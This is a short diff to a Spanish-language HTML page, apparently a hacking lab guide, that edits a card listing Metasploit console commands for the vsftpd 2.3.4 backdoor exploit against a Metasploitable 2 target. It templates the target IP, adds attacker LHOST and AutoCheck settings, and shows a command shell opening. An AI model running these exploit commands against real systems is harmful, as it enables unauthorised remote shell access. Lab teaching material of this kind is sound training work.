@@ -13,10 +13,12 @@
   <div class="card glow-red">
     <div class="card-title">🎯 msfconsole (laboratorio)</div>
     <p style="font-size:0.9rem;color:var(--text-dim);">
-      Contra el host <code>Metasploitable 2</code> (<code>192.168.56.13</code>):
+      Contra el host <code>Metasploitable 2</code> (<code>{{ lab_ip }}</code>):
     </p>
     <div class="code-block">msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
-msf6 > set RHOSTS 192.168.56.13
+msf6 > set RHOSTS {{ lab_ip }}
+msf6 > set LHOST &lt;IP_DE_TU_KALI&gt;
+msf6 > set AutoCheck false
 msf6 > run
 
 [*] Command shell session 1 opened
